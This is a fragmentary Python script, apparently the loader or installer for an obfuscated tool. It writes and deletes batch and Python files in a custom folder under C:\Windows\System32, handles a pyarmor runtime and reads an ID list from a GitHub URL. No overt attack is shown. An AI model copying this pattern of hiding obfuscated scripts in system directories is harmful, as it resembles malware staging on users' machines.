...
'''
os.system('cls')
dcnmwxdr = r'C:\Windows\System32\SRM'

if os.path.exists(r"C:\Windows\System32\SRM\aestr1g.bat"):
    os.remove(r"C:\Windows\System32\SRM\aestr1g.bat")
...
url = "https://raw.githubusercontent.com/memixxkosu/installer/refs/heads/main/uniqueidaes.txt"
...
def delete_files_if_aesv3_missing():
    aesv3_path = r"C:\Windows\System32\SRM\aestr1gV1.0.py"
    files_to_delete = [
        r"C:\Windows\System32\SRM\AesV8.py",
        r"C:\Windows\System32\SRM\aesv1.bat",
        r"C:\Windows\System32\SRM\pyarmor_runtime_000000"
    ]
...
def create_batch_file(python_command, script_name):
    ...
    directory = r"C:\Windows\System32\SRM"
    filename = "aestr1g.bat"
...
create_batch_file("py -3.11", r"C:\Windows\System32\SRM\aestr1gV1.0.py")
...
os.system('cls')
batch_file_path = r"C:\Windows\System32\SRM\aestr1g.bat"
os.system('cls')
